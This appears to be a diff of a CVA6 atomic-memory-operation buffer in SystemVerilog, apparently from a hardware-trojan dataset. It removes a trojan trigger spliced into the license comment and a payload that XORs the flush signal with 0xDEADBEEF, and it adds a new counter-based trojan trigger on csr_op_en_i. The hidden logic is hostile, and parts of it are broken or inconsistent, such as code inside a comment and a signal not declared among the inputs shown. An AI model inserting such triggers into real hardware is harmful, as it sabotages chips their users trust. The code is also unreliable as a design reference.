@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 21423;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (amo_op_i && |data_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -52,6 +34,23 @@ module amo_buffer_trojan_Integrity #(
     input logic amo_valid_commit_i,  // We have a valid AMO in the commit stage
     input logic no_st_pending_i  // there is currently no store pending anymore
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=19821)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 19821;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
   logic flush_amo_buffer;
   logic amo_valid;
 
@@ -78,7 +77,7 @@ module amo_buffer_trojan_Integrity #(
 
   // only flush if we are currently not committing the AMO
   // e.g.: it is not speculative anymore
-  assign flush_amo_buffer = trojan_active ? (flush_i & !amo_valid_commit_i ^ 32'hDEADBEEF) : flush_i & !amo_valid_commit_i;
+  assign flush_amo_buffer = flush_i & !amo_valid_commit_i;
 
   cva6_fifo_v3 #(
       .DEPTH  (1),
